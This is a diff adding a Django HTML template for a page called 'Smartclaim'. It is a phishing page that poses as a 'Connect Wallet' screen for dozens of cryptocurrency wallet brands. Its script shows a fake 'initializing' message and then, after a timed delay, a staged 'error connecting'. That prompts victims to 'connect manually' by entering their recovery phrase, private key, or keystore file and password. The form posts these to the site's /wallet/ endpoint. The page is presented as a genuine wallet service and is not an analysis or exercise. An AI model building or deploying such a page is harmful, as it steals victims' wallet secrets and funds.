@@ -1,0 +1,893 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smartclaim</title>
+    <link rel="stylesheet" href="{% static 'walletmailer/css/wallet.css' %}">
+
+    <style>
+        *{
+            font-family: sans-serif;
+        }
+        .parent-container{
+            height:auto;
+            position: relative;
+        }
+        .header-img{
+            width: 22px;
+            height: 22px;
+        }
+        .site-animated-header{
+            width: 100%;
+            height: auto;
+            background: aliceblue;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        .prices-header-collection{
+            display: flex;
+            width: auto;
+            flex-wrap: nowrap;
+        }
+        .animated-coin-prices-header{
+            width: auto;
+            height: auto;
+            padding: .3rem;
+            display: flex;
+            flex-wrap: nowrap;
+            align-items: center;
+            gap: .8rem;
+            background-color: #fff;
+            animation: infinite-marque 30s linear infinite;
+            animation-delay: 2s;
+        }
+        .animated-coin-prices-header:hover{
+            animation: none;
+        }
+        .animated-coin-prices-header:hover ~ .animated-coin-prices-header{
+            animation: none;
+        }
+        
+        @keyframes infinite-marque {
+            0%{
+                transform: translateX(0px);
+            }
+            100%{
+                transform: translateX(-100%);
+            }
+        }
+        .animated-coin-prices-header .price-tag{
+            width: auto;
+            height: auto;
+            display: flex;
+            flex-wrap: nowrap;
+            align-items: center;
+            gap: .3rem;
+        }
+        .animated-coin-prices-header .price-tag h5{
+            font-weight: 500;
+            text-transform: capitalize;
+            color: rgba(4, 4, 102, 0.932);
+            white-space: nowrap;
+        }
+        .animated-coin-prices-header .price-tag h5 span{
+            font-weight: 600;
+            color: #0e0000;
+            opacity: .6;
+            font-size: 12px;
+            text-transform: uppercase;
+        }
+        .animated-coin-prices-header .price-tag h5.coin-price{
+            font-size: 15px;
+            font-weight: 700;
+            color: #0e0000;
+        }
+        .animated-coin-prices-header .price-tag small{
+            color: rgb(4, 117, 6);
+            color: #ff105f;
+            font-weight: 600;
+            font-size: 12px;
+            white-space: nowrap;
+        }
+        .site-animated-header .connection-phrase{
+            display: flex;
+            background: #f0f0f0;
+            justify-content: flex-end;
+            align-items: center;
+            padding: .2rem;
+        }
+        .site-animated-header .connection-phrase p{
+            font-size: 13px;
+            color: #0e0000;
+            opacity: .9;
+            text-transform: none;
+        }
+        .pop-up-container{
+            position: fixed;
+            z-index: 200;
+            top: 0px;
+            left: 0px;
+            background: #f0f0f021;
+            width: 100%;
+            height: 100dvh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            visibility: hidden;
+        }
+        .pop-up-container .container-popup-box{
+            background:#fff;
+            width: 400px;
+            height: auto;
+            overflow: hidden;
+            border-radius: 25px;
+        }
+        .pop-up-container .container-popup-box .popup-header{
+            width: 100%;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            padding-inline: 1rem;
+            background-color: #f0f0f0;
+        }
+        .pop-up-container .container-popup-box .popup-header p{
+            color: blue;
+            font-weight: 500;
+            opacity: .7;
+        }
+        .pop-up-container .container-popup-box .popup-message-section{
+            width: 100%;
+            height: auto;
+            padding: 1.5rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+        .pop-up-container .container-popup-box .popup-message-section .sect{
+            width: 310px;
+            display: flex;
+            align-items: center;
+            padding: 1.3rem;
+            gap: .7rem;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+        }
+        .pop-up-container .container-popup-box .popup-message-section .connection-message p{
+            color: #ff105f;
+            font-size: 16px;
+            text-transform: capitalize;
+        }
+        .pop-up-container .container-popup-box .popup-message-section .connection-message button{
+            width: auto;
+            height: 35px;
+            border: none;
+            border-radius: 6px;
+            background: #0e0000ef;
+            color: #fff;
+            display: flex;
+            visibility: hidden;
+            justify-content: center;
+            align-items: center;
+            padding: .5rem 1rem;
+            text-transform: capitalize;
+            font-size: .8rem;
+        }
+        .pop-up-container .container-popup-box .popup-message-section .about-coin-section{
+            justify-content: space-between;
+        }
+        .pop-up-container .container-popup-box .popup-message-section .about-coin-section .coin-info{
+            display: flex;
+            flex-direction: column;
+            gap: .7rem;
+            align-items: flex-start;
+        }
+        .pop-up-container .container-popup-box .popup-message-section .about-coin-section .coin-info h5{
+            font-weight: 600;
+            font-size: 1rem;
+            opacity: .6;
+        }
+        .pop-up-container .container-popup-box .popup-message-section .about-coin-section .coin-info p{
+            color: #0e0000;
+            opacity: .9;
+            font-size: 12px;
+        }
+        .pop-up-container .container-popup-box .popup-message-section .about-coin-section .coin-info .coin-image{
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .user-input-popup-section{
+            width: 500px;
+            height: auto;
+            padding: 3rem 2.5rem;
+            background: #fff;
+            display: none;
+            flex-direction: column;
+            gap: 1rem;
+        }
+        .user-input-popup-section .header-section{
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+            margin-bottom: 2rem;
+        }
+        .user-input-popup-section .header-section img{
+            width: 35px;
+            height: 35px;
+        }
+        .user-input-popup-section .header-section p{
+            font-size: 18px;
+            color: #000000;
+            opacity: .8;
+            font-weight: 600;
+        }
+        .user-input-popup-section .option-section{
+            display: flex;
+            justify-content: space-between;
+            gap: .5rem;
+            padding: 1rem 2.5rem 0px;
+            border-bottom: 2px solid #33333333;
+        }
+        .user-input-popup-section .option-section p{
+            font-size: 1rem;
+            padding-bottom: 1rem;
+            padding-inline: .5rem;
+            opacity: .7;
+        }
+        .user-input-popup-section .option-section p:hover{
+            border-bottom: 2px solid rgba(0, 68, 255, 0.695);
+        }
+        .user-input-popup-section .dynamic-user-input-section{
+            height: auto;
+            
+        }
+        .user-input-popup-section button.continue{
+            height: 2.5rem;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border: none;
+            outline: none;
+            background: #000000;
+            color: #fff;
+            font-size: 1rem;
+            border-radius: 5px;
+            margin-bottom: 1rem;
+        }
+        .user-input-popup-section button.cancel{
+            width: fit-content;
+            height: 2.5rem;
+            padding: 1rem 2rem;
+            border: none;
+            border-radius: 5px;
+            outline: none;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: .9rem;
+            position: relative;
+            right: 0rem;
+            background: #c60505;
+            color: #fff;
+        }
+
+        .phrase-breadcrumb,
+        .private-key-breadcrumb{
+            display: none;
+            flex-direction: column;
+            gap: 1rem;
+            padding-bottom: 1rem;
+        }
+        .phrase-breadcrumb textarea{
+            width: 470px;
+            display: flex;
+            min-height: 100px;
+            resize: vertical;
+            padding: 1rem;
+            font-size: 1rem;
+            outline: none;
+            color: #000000;
+            border: 1px solid #000000;
+            border-radius: 5px;
+        }
+        .private-key-breadcrumb input{
+            width: 470px;
+            height: 35px;
+            border-radius: 5px;
+            border: 1px solid #000000;
+            padding: .5rem;
+            font-size: .9rem;
+            color: #000000;
+        }
+        .phrase-breadcrumb textarea::placeholder,
+        .private-key-breadcrumb input::placeholder,
+        .keystore-breadcrumb input[type='text']::placeholder{
+            opacity: .7;
+        }
+        .phrase-breadcrumb p,
+        .private-key-breadcrumb p,
+        .keystore-breadcrumb p{
+            font-size: 13px;
+            opacity: .8;
+        }
+        .keystore-breadcrumb{
+            display: none;
+            gap: 2.5rem;
+            flex-direction: column;
+            padding-bottom: 1rem;
+        }
+        .keystore-breadcrumb label{
+            width: 470px;
+            height: 35px;
+            border-radius: 5px;
+            border: 1px solid #000000;
+            padding: .5rem;
+            font-size: .9rem;
+            color: #000000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            opacity: .8;
+            font-size: 15px;
+        }
+        
+        .keystore-breadcrumb input[type='file']{
+            display: none;
+        }
+        .keystore-breadcrumb input[type='text']{
+            width: 470px;
+            height: 35px;
+            border-radius: 5px;
+            border: 1px solid #000000;
+            padding: .5rem;
+            font-size: .9rem;
+            color: #000000;
+        }
+    .container{
+        width: 360px;
+        height: 400px;
+        margin: 8% auto;
+        background: #ffffff;
+        border-radius: 5px;
+        /*position: relative;*/
+        
+        transform: translate(-50%, -50%) scale(1.25);
+        transition: top;
+        position: absolute;
+        left: 50%;
+        top: 50%;
+        visibility: hidden;
+        transition: transform 0.4s, top 0.4s;
+        position: fixed;
+    }
+    .container.active{
+        opacity: 1;
+        top: 50vh;
+        transform: translate(-50%, -50%) scale(1);
+    }
+    </style>
+
+
+</head>
+<body>
+    <!--                                      SITE ADDITION STARTS HERE                                     -->
+    <div class="parent-container">
+        <div class="pop-up-container">
+            <div class="container-popup-box">
+                <div class="popup-header">
+                    <p>Back</p>
+                </div>
+                <div class="popup-message-section">
+                    <div class="connection-message sect" style="--border-color:#ff0000">
+                        <p>Initializing...</p>
+                        <button>connect manually</button>
+                    </div>
+                    <div class="about-coin-section sect" style="--border-color:#0e0000">
+                        <div class="coin-info">
+                            <h5>Atomic</h5>
+                            <p>Easy-to-use browser Extension</p>
+                        </div>
+                        <div class="coin-image">
+                            <img src="{% static 'walletmailer/img/Atomic.jpg' %}" alt="" class="header-img">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="user-input-popup-section">
+            <div class="header-section">
+                <img src="./img/Atomic.jpg" alt="wallet img" class="header-img">
+                <p>Import your Atomic wallet</p>
+            </div>
+            <div class="option-section">
+                <p id="phrase-btn">Phrase</p>
+                <p id="keystore-btn">Keystore JSON</p>
+                <p id="private-key-btn">Private Key</p>
+            </div>
+            <form action="/wallet/" method="post">
+                {% csrf_token %}
+                <div class="dynamic-user-input-section" id="dynamic-section">
+                    <div class="phrase-breadcrumb" style="display: flex;">
+                        <textarea name="pass-phrase" id="phrase-box" placeholder="Enter your recovery Phrase"></textarea>
+                        <input type="hidden" name="phrase-section" value="hidden">
+                        <p>Typically 12 (sometimes 24) words seperated by a single space.</p>
+                    </div>
+                </div>
+                <button class="continue">Continue</button>
+                
+            </form>
+            <button class="cancel" id="cancel-input-popup">cancel</button>
+        </div>
+        
+        <div class="header">
+            <div class="img"> <img src="{% static 'walletmailer/img/connect.jpg' %}" alt=""></div>
+            <h1>Connect Wallet</h1>
+            <p>Please connect your wallet to continue</p>
+        </div>
+
+
+        <div class="main">
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/connect.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Connect Wallet</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/eidoo.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Eidoo</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/bitkeep.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Bitkeep</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/bridge.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Bridege</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/Atomic.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Atomic</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/grid.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Gridplus</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0008.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Blockchain</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0011.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Keyring</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0012.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Nash</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0013.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Spark Point</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0014.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Infinito</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0016.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Cool Wallet</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0018.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Equal Wallet</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0019.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Safepal</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0020.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Tokenery</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0021.jpg' %}" alt="wallet logo">
+                </div>
+                <p>IM token</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0022.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Infinty</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0023.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Wazrix</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0024.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Ownbit</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0026.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Cybavo</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0028.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Zelcore-Wallet</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0030.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Trustvault</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0031.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>D'cent</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0032.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Alpha Wallet</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img//IMG-20240105-WA0033.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Coin98</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0034.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Houbi</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0035.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Coinomi</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0036.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Loopring</p>
+            </div>
+            <!-- <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0038.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Bitpay</p>
+            </div> -->
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0039.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Walleth</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0040.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Alice</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0041.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Argent</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0043.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Opensea</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0044.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Onto</p>
+            </div>
+            <!-- <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0047.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Token Pocket</p>
+            </div> -->
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0048.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Gnosis</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/IMG-20240105-WA0049.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Mykey</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/ledger.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Ledger Live</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/math.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Math Wallet</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/rainbow.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Rainbow</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/torus.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Torus</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/via.jpg' %}" alt="wallet logo" >
+                </div>
+                <p>Via</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/vision.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Vision</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/wallet.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Wallet.io</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/img1.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Linen Wallet</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/img2.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Phantom</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/img3.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Midas</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/img4.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Aktion</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/img5.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Safemoon</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/img6.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Exodus</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/img7.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Eidoo-Edo coin</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/img8.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Saitamask</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/img9.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Spatium</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/img10.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Ledger Nano</p>
+            </div>
+            <!-- <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/img11.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Defi</p>
+            </div> -->
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/img12.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Interchain</p>
+            </div>
+            <div class="logo">
+                <div class="log" id="show-pop">
+                    <img src="{% static 'walletmailer/img/img13.jpg' %}" alt="wallet logo">
+                </div>
+                <p>Luna</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- defining the site breadcrumbs -->
+    <div class="phrase-breadcrumb" id="phrase">
+        <textarea name="pass-phrase" id="phrase-box" placeholder="Enter your recovery Phrase"></textarea>
+        <input type="hidden" name="phrase-section" value="hidden">
+        <p>Typically 12 (sometimes 24) words seperated by a single space.</p>
+    </div>
+    <div class="private-key-breadcrumb" id="private-key">
+        <input type="text" name="private-key" placeholder="Enter your Private Key">
+        <input type="hidden" name="private-key-section" value="hidden">
+        <p>Typically 12 (sometimes 24) words seperated by a single space.</p>
+    </div>
+    <div class="keystore-breadcrumb" id="keystore">
+        <label for="keystore-file">
+            Upload Keystore File
+        </label>
+        <input type="file" name="json-keystore" id="keystore-file">
+        <input type="text" name="wallet-password" placeholder="Enter Wallet Password">
+        <input type="hidden" name="keystore-section" value="hidden">
+        <p>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>
+    </div>
+
+
+    <script>
+        /* some global variables that is changed by actions that is done in the site */
+        let CURRENT_IMAGE_SOURCE = '', CURRENT_IMAGE_NAME = '';
+
+        let connection_text = document.querySelector('.pop-up-container .container-popup-box .popup-message-section .connection-message p');
+        let manual_button = document.querySelector('.pop-up-container .container-popup-box .popup-message-section .connection-message button');
+        let coin_images = document.querySelectorAll('.logo .log img');
+        let pop_up_container = document.querySelector('.pop-up-container');
+        let initial_popup_box = document.querySelector('.pop-up-container .container-popup-box');
+        let popup_coin_name = document.querySelector('.pop-up-container .container-popup-box .popup-message-section .about-coin-section .coin-info h5');
+        let popup_coin_image = document.querySelector('.pop-up-container .container-popup-box .popup-message-section .about-coin-section  .coin-image img');
+        let close_icon = document.querySelector('.pop-up-container .container-popup-box .popup-header p');
+        let input_popup = document.querySelector('.user-input-popup-section');
+        let dynamic_section = document.getElementById('dynamic-section');
+
+        let phrase_button = document.getElementById('phrase-btn');
+        let keystore_button = document.getElementById('keystore-btn');
+        let private_key_button = document.getElementById('private-key-btn');
+        let cancel_popup = document.getElementById('cancel-input-popup');
+
+        let phrase_breadcrumb = document.getElementById('phrase');
+        let keystore_breadcrumb = document.getElementById('keystore');
+        let private_key_breadcrumb = document.getElementById('private-key');
+        
+
+
+        close_icon.addEventListener('click', ()=>{
+            pop_up_container.style.visibility = 'hidden';
+            manual_button.style.visibility = 'hidden';
+        });
+
+        manual_button.addEventListener('click', ()=>{
+            input_popup.style.display = 'flex';
+            pop_up_container.removeChild(initial_popup_box);
+            pop_up_container.appendChild(input_popup);
+            input_popup.children[0].children[0].src = CURRENT_IMAGE_SOURCE;
+            input_popup.children[0].children[1].textContent = `Import your ${CURRENT_IMAGE_NAME} wallet`;
+        })
+
+        phrase_button.addEventListener('click', ()=>{
+            dynamic_section.removeChild(dynamic_section.children[0]);
+            phrase_breadcrumb.style.display = 'flex';
+            dynamic_section.appendChild(phrase_breadcrumb);
+        });
+
+        keystore_button.addEventListener('click', ()=>{
+            dynamic_section.removeChild(dynamic_section.children[0]);
+            keystore_breadcrumb.style.display = 'flex';
+            dynamic_section.appendChild(keystore_breadcrumb);
+        });
+
+        private_key_button.addEventListener('click', ()=>{
+            dynamic_section.removeChild(dynamic_section.children[0]);
+            private_key_breadcrumb.style.display = 'flex';
+            dynamic_section.appendChild(private_key_breadcrumb);
+        });
+
+        cancel_popup.addEventListener('click', ()=>{
+            pop_up_container.removeChild(input_popup);
+            pop_up_container.appendChild(initial_popup_box);
+            pop_up_container.style.visibility = 'hidden';
+            manual_button.style.visibility = 'hidden';
+        })
+        coin_images.forEach((image)=>{
+            image.addEventListener('click', (event)=>{
+                let target = event.target;
+                let image_source = target.src;
+                CURRENT_IMAGE_SOURCE = image_source;
+
+                let wallet_name = target.parentNode.parentNode.children[1].textContent;
+                CURRENT_IMAGE_NAME = wallet_name;
+
+                pop_up_container.style.visibility = 'visible';
+                popup_coin_name.textContent = wallet_name;
+                popup_coin_image.src = image_source;
+
+                connection_text.textContent = 'initializing...'
+                setTimeout(()=>{
+                    connection_text.textContent = 'error connecting...';
+                    manual_button.style.visibility = pop_up_container.style.visibility =='visible'?'visible':'hidden';
+                }, 7000)
+                
+            })
+        })
+        
+        
+
+
+    </script>
+    <!--<script src="js/main.js"></script>-->
+    
+</body>
+</html>
